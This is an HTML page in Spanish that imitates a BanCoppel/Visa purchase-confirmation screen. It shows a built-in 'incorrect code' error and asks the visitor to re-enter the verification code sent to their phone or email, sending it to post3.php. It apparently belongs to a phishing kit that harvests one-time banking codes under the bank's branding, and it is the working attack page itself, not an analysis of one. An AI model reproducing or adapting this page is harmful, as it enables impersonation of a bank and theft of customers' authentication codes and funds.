<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmación de Compra - BanCoppel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            max-width: 500px;
            background-color: #fff;
            padding: 20px;
            border-radius: 10px;
            text-align: left;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }
        .logo {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logo img {
            max-height: 50px;
        }
        .details p {
            margin: 5px 0;
        }
        .details input {
            width: 200px;
            margin-top: 10px;
        }
        .activate-btn {
            margin-top: 20px;
        }
        .text-center a {
            text-decoration: none;
            color: #000;
            font-weight: bold;
        }
        .error-message {
            color: red;
            font-weight: bold;
            margin-bottom: 15px;
        }
        .is-invalid {
            border-color: red;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="img/bancoppel.png" alt="BanCoppel">
            <img src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png" alt="Visa">
        </div>
        <p>Si deseas continuar con la compra, ingresa el código de verificación enviado a tu celular o correo electrónico.</p>

        <!-- Mensaje de error en rojo -->
        <div class="error-message">
            Código incorrecto. Por favor, intenta nuevamente.
        </div>

        <h6>Detalles transaccionales</h6>
        <form action="post3.php" method="POST">
            <div class="details">
                <p><strong>Comercio:</strong> Digital</p>
                <p><strong>Número de tarjeta:</strong> ************</p>
                <!-- Input con clase is-invalid para mostrar en rojo -->
                <p><strong>Digite el código:</strong> <input type="text" class="form-control d-inline-block is-invalid" name="codigo"></p>
            </div>

            <div class="activate-btn">
                <a href="#" class="d-block mb-2">Presione aquí para recibir un nuevo código</a>
                <button type="submit" class="btn btn-dark">Activar</button>
            </div>
        </form>
        <div class="text-center mt-3">
            <a href="#">Salir</a>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
